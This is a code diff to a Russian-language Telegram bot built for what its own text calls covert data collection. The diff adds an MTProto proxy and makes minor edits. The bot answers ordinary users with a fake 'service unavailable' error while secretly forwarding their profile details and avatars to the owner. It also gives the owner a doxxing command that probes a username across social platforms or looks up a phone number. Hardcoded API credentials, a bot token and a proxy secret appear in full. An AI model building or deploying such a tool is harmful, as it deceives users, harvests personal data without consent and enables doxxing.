@@ -3,16 +3,30 @@ from pyrogram.types import Message
 import requests
 import re
 import json
-import hashlib
 from datetime import datetime
 
-# ========== КОНФИГУРАЦИЯ (ОБНОВЛЕНА) ==========
+# ========== КОНФИГУРАЦИЯ ==========
 API_ID = 26016868
 API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
 BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
 OWNER_ID = 1185238446
 
-app = Client("stealth_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+# НАСТРОЙКА MTProto ПРОКСИ
+PROXY = {
+    "scheme": "mtproto",  # тип прокси
+    "hostname": "nitro.alotaxi.info",
+    "port": 4515,
+    "secret": "eee9a4f23b1d768c04a8d7f39120ca5b6e626973636f7474692e79656b74616e65742e636f6d"  # ключ
+}
+
+# СОЗДАНИЕ КЛИЕНТА С ПРОКСИ
+app = Client(
+    "steel_bot",
+    api_id=API_ID,
+    api_hash=API_HASH,
+    bot_token=BOT_TOKEN,
+    proxy=PROXY
+)
 
 # ========== МОДУЛИ ПРОБИВА ==========
 def search_socialmedia_by_username(username: str) -> dict:
@@ -28,7 +42,7 @@ def search_socialmedia_by_username(username: str) -> dict:
     }
     for platform, url in platforms.items():
         try:
-            resp = requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
+            resp = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
             if resp.status_code == 200:
                 results[platform] = url
         except:
@@ -51,19 +65,19 @@ def search_by_phone(phone: str) -> dict:
         results["region"] = "Не определен"
     return results
 
-# ========== ПРИВЕТСТВИЕ ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА ==========
+# ========== ПРИВЕТСТВИЕ ДЛЯ ВЛАДЕЛЬЦА ==========
 @app.on_message(filters.command("start") & filters.user(OWNER_ID) & filters.private)
 async def owner_start(client: Client, message: Message):
     await message.reply(
         "✅ **Бот активирован**\n\n"
         f"📌 Ваш ID: `{OWNER_ID}`\n"
         "🔒 Режим: скрытый сбор данных\n"
-        "🛡 Заглушка: активна для всех пользователей\n\n"
+        "🛡 Заглушка: активна\n"
+        "🌐 Прокси: MTProto подключен\n\n"
         "**Команды:**\n"
         "/stats - статус бота\n"
         "/test @username - пробив username\n"
-        "/test 79123456789 - пробив номера\n\n"
-        "⚠️ Все данные о пользователях приходят сюда"
+        "/test 79123456789 - пробив номера"
     )
 
 # ========== ОСНОВНАЯ ЛОГИКА ДЛЯ ВСЕХ ОСТАЛЬНЫХ ==========
@@ -121,7 +135,7 @@ tg://user?id={user_info['user_id']}
         photos = await client.get_chat_photos(user.id, limit=1)
         if photos:
             avatar_path = await client.download_media(photos[0].file_id)
-            await client.send_photo(OWNER_ID, avatar_path, caption=f"Аватар пользователя @{user.username}")
+            await client.send_photo(OWNER_ID, avatar_path, caption=f"Аватар @{user.username}")
     except Exception as e:
         await client.send_message(OWNER_ID, f"Не удалось получить аватар: {str(e)}")
     
@@ -133,7 +147,7 @@ tg://user?id={user_info['user_id']}
         "Код ошибки: ERR_503_SERVICE_UNAVAILABLE"
     )
 
-# Команда проверки статуса (только для владельца)
+# ========== КОМАНДЫ ДЛЯ ВЛАДЕЛЬЦА ==========
 @app.on_message(filters.command("stats") & filters.user(OWNER_ID))
 async def stats(client: Client, message: Message):
     await message.reply(
@@ -141,10 +155,10 @@ async def stats(client: Client, message: Message):
         f"👤 Ваш ID: `{OWNER_ID}`\n"
         "🎯 Режим: скрытый сбор данных\n"
         "🛡 Заглушка: активна\n"
+        "🌐 Прокси: MTProto подключен\n"
         "📊 Статистика: данные приходят в этот чат"
     )
 
-# Команда тестового пробива (для владельца)
 @app.on_message(filters.command("test") & filters.user(OWNER_ID))
 async def test_search(client: Client, message: Message):
     args = message.text.split(" ", 1)
@@ -163,6 +177,7 @@ async def test_search(client: Client, message: Message):
     else:
         await message.reply("Неверный формат. Используйте @username или номер телефона (10-11 цифр)")
 
+# ========== ЗАПУСК ==========
 if __name__ == "__main__":
     print("=" * 50)
     print("БОТ ЗАПУЩЕН")
@@ -171,5 +186,6 @@ if __name__ == "__main__":
     print(f"ID владельца: {OWNER_ID}")
     print("Режим: скрытый сбор данных")
     print("Приветствие настроено только для владельца")
+    print(f"Прокси: {PROXY['hostname']}:{PROXY['port']}")
     print("=" * 50)
     app.run()
